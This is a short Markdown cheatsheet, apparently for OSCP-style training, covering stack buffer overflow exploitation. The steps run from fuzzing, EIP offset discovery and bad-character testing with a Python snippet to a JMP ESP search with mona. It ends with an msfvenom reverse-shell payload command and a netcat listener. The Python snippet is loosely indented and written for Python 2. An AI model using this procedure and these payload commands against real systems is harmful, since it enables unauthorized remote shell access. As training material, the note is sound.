# Buffer Oveflow

## Identify Overflow Length

> 1. Attach debugger
> 2. Run fuzzer script
> 3. Run confirm-overflow script

## Control EIP

> 1. Create pattern: `msf-pattern_create -l <length>`
> 2. Run locate-offset script
> 3. Locate offset: `msf-pattern_offset -l <length> <eip-value>`
> 4. Run verify-offset script

## Locate Space for Shellcode

> 1. Run increase-overflow script to attempt increasing overflow size
> 2. If successful, run bad-char script
>
> - On the debug machine, we can generate a file which contains the same list of badchars with the help of python:
>
> ```python
> badchar_test = ""
>   badchars = [0x00, 0x0A, 0xAD]
>   for i in range(0x00, 0xFF+1):
>   	  if i not in badchars:
>        badchar_test += chr(i)
>   with open("badchar_test.bin", "wb") as f:
>      f.write(badchar_test)
> ```
>
> - Now, we can compare the contents of stack pointed by esp and the file using mona module:
>
>   `!mona compare -a esp -f C:\Python27\badchar_test.bin`

## Find Return Address

> 1. Locate module w/ least memory protection: mona.py `!mona modules`
> 2. JMP ESP hex: `msf-nasm_shell > jmp esp` (FFE4)
> 3. Locate JMP ESP w/ no bad chars: mona.py `find -s "\xff\xe4" -m "<dll module>"`
> 4. Run verify-jmp-esp script

## Getting Shell

> 1. Generate payload: `msfvenom -p <payload> LHOST=<ip> LPORT=<port> EXITFUNC=thread -f <format> -e x86/shikata_ga_nai -b "<bad-chars> (e.g. \x00\x0a\x0d\x25\x26\x2b\x3d)"`
> 2. Run listener: `sudo nc -nvlp <port>`
> 3. Run exploit script

## Cheatsheets

> - [Tib3rius/Pentest-Cheatsheets](https://github.com/Tib3rius/Pentest-Cheatsheets/blob/master/exploits/buffer-overflows.rst)
> - [V1n1v131r4/OSCP-Buffer-Overflow](https://github.com/V1n1v131r4/OSCP-Buffer-Overflow)
> - [Liodeus](https://liodeus.github.io/2020/09/18/OSCP-personal-cheatsheet.html)
